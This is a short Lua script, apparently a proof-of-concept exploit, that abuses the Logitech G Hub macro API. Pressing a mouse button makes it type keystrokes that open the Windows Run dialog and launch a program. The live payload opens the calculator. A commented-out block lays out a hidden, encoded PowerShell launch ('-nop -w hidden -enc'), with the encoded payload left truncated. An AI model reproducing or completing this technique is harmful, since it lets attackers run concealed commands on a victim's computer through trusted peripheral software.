-- Lua script to execute system commands in Logitech Hub (LGHUB)
-- Using Logitech G-Series Lua API
-- https://douile.com/logitech-toggle-keys/APIDocs.pdf
-- by @Exploitation

function OnEvent(event, arg)
    if (event == "MOUSE_BUTTON_PRESSED" and arg == 5) then
        PressAndReleaseKey("lgui")
        Sleep(300)
        PressAndReleaseKey("r")
        Sleep(100)
        PressAndReleaseKey("u")
        Sleep(100)
        PressAndReleaseKey("n")
        Sleep(100)
        PressAndReleaseKey("enter")
        Sleep(300)
        xpl()
   end
end

function xpl()

    -- powershell.exe -nop -w hidden -enc sQB...
    -- local keys = {
    -- "p", "o", "w", "e", "r", "s", "h", "e", "l", "l", 
    -- "spacebar", 
    -- "minus", "n", "o", "p", 
    -- "spacebar", 
    -- "minus", "w", 
    -- "spacebar", 
    -- "h", "i", "d", "d", "e", "n", 
    -- "spacebar", 
    -- "minus", "e", "n", "c", 
    -- "spacebar", 
    -- "s", "Q", "B", "...", "enter" }

    -- calc
    local keys = {"c", "a", "l", "c", "enter"}
          for i, key in ipairs(keys) do
              PressAndReleaseKey(key)
              Sleep(200)
          end
    end
